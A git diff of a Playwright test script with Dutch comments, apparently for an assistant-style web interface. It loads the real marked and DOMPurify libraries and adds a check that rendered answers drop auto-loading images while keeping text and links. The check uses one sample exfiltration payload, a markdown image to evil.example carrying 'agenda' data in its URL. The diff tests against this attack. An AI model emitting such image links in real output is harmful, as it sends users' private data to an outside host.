@@ -5,7 +5,11 @@ import http from "node:http";
 import fs from "node:fs";
 import path from "node:path";
 
-const { chromium } = createRequire(import.meta.url)("playwright"); // ook een globaal geïnstalleerde Playwright (NODE_PATH)
+const laad = createRequire(import.meta.url);
+const { chromium } = laad("playwright"); // ook een globaal geïnstalleerde Playwright (NODE_PATH)
+// De echte marked en DOMPurify (zelfde versies als index.html), zodat we testen wat er echt in beeld komt.
+const MARKED = fs.readFileSync(laad.resolve("marked/marked.min.js"), "utf8");
+const PURIFY = fs.readFileSync(laad.resolve("dompurify/dist/purify.min.js"), "utf8");
 const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
 let fouten = 0;
 const ok = (c, m) => { console.log(c ? "OK  " : "FOUT", m); if (!c) fouten++; };
@@ -64,8 +68,8 @@ for (const [naam, vp] of [["computer", { width: 1440, height: 900 }], ["telefoon
     const u = r.request().url();
     if (u.startsWith(basis)) return r.continue();
     if (u.includes("supabase-js")) return r.fulfill({ contentType: "text/javascript", body: NEP_SUPABASE });
-    if (u.includes("marked")) return r.fulfill({ contentType: "text/javascript", body: "window.marked={parse:(t)=>t}" });
-    if (u.includes("purify")) return r.fulfill({ contentType: "text/javascript", body: "window.DOMPurify={sanitize:(t)=>t}" });
+    if (u.includes("marked")) return r.fulfill({ contentType: "text/javascript", body: MARKED });
+    if (u.includes("purify")) return r.fulfill({ contentType: "text/javascript", body: PURIFY });
     return r.fulfill({ status: 404, body: "" });
   });
   await page.goto(basis + "/index.html");
@@ -75,6 +79,10 @@ for (const [naam, vp] of [["computer", { width: 1440, height: 900 }], ["telefoon
   const schakelaars = await page.$$eval(".switch span", (s) => s.map((x) => x.textContent.replace(/\s+/g, " ").trim()));
   ok(schakelaars.includes("2× KLAPPEN") && schakelaars.includes("WERKMODUS"), `${naam}: schakelaars 2× KLAPPEN en WERKMODUS (${schakelaars.join(", ")})`);
   ok(!schakelaars.some((s) => /HÉ ECO/.test(s)), `${naam}: geen "Hé ECO"-schakelaar meer`);
+
+  // Antwoorden: geen plaatjes die vanzelf laden (zouden gegevens naar buiten kunnen sturen), tekst en links blijven
+  const html = await page.evaluate(() => md("Klaar. ![x](https://evil.example/p.png?d=agenda) [bron](https://nos.nl)"));
+  ok(!/<img/i.test(html) && /href="https:\/\/nos\.nl"/.test(html) && /Klaar\./.test(html), `${naam}: antwoord zonder plaatje, wel tekst en link`);
 
   // Werkmodus: reactor naar rechtsonder, stappen live, daarna terug
   const plek = () => page.$eval(".main-reactor", (e) => e.getBoundingClientRect().toJSON());
